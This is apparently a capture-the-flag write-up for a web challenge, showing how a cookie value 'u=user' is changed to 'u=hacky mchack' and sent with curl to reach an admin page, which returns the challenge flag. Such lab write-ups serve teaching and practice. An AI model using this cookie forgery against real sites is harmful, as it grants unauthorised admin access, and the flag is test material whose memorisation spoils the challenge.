# Web: Cookies and Session Management: Chef hacky mchack

Visiting http://141.85.224.70:8087/ loaded a typical HTML-based portfolio.

Using browser dev tools, under Application → Cookies, we observed:

```makefile
Cookie: u=user
```

Since the challenge was about session management, we tried changing the cookie value.

## Exploitation

Using the challenge title as inspiration, we modified the cookie to:

```ini
u=hacky mchack
```

Then we accessed a likely admin-only page, manage.php that we found on the main page in the top navbar:

```bash
curl -s -b "u=hacky mchack" http://141.85.224.70:8087/manage.php
```

This returned: <div style="opacity: 0.05">**SSS{n0_m0r3_c00ki3s_f0r_y0u_m1st3r}**</div>
